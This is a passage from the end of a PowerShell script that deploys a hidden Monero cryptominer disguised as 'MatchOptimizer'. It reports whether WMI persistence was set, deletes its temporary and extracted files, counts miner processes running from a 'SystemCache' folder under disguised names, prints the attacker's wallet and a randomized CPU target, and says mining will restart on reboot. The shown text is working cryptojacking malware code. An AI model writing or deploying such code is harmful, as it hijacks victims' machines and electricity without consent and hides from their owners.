    Write-Host "SUCCESS WMI persistence set" -ForegroundColor Green
} catch { 
    Write-Host "FAILED WMI persistence failed" -ForegroundColor Red
}

# ===== CLEANUP =====
Remove-Item -Path $TempFile -Force -ErrorAction SilentlyContinue
Remove-Item -Path $ExtractPath -Recurse -Force -ErrorAction SilentlyContinue

# ===== FINAL STATUS =====
Write-Host "`n=== MATCHOPTIMIZER UNIVERSAL DEPLOYMENT COMPLETE ===" -ForegroundColor Green

$minerFiles = Get-ChildItem $MinerDir -Filter "*.exe" -ErrorAction SilentlyContinue
$runningMiners = 0
$currentProcessNames = Get-SafeProcessNames
foreach ($name in $currentProcessNames) {
    $process = Get-Process -Name $name -ErrorAction SilentlyContinue | Where-Object { $_.Path -like "*SystemCache*" }
    if ($process) { $runningMiners++ }
}

Write-Host "System: $windowsVersion ($cpuArch) - $(if($isHP){'HP'}elseif($isDell){'Dell'}else{'Standard'})" -ForegroundColor Cyan
Write-Host "Miner Files: $($minerFiles.Count)" -ForegroundColor $(if($minerFiles.Count -gt 0){'Green'}else{'Red'})
Write-Host "Running Miners: $runningMiners" -ForegroundColor $(if($runningMiners -gt 0){'Green'}else{'Yellow'})
Write-Host "Status: $(if($runningMiners -gt 0){'ACTIVE'}else{'DEPLOYED'})" -ForegroundColor $(if($runningMiners -gt 0){'Green'}else{'Yellow'})

Write-Host "Your Wallet: $Wallet" -ForegroundColor Yellow
Write-Host "CPU Usage Target: $randomCpu%" -ForegroundColor Cyan

if ($runningMiners -gt 0) {
    Write-Host "`n🎉 MATCHOPTIMIZER OPERATION SUCCESSFUL!" -ForegroundColor Green
    Write-Host "The system is now actively mining Monero." -ForegroundColor White
} else {
    Write-Host "`n⚠️ Components deployed but not running" -ForegroundColor Yellow
    Write-Host "Mining will start automatically on system reboot." -ForegroundColor White
}

Write-Host "`nMatchOptimizer deployment Complete!" -ForegroundColor White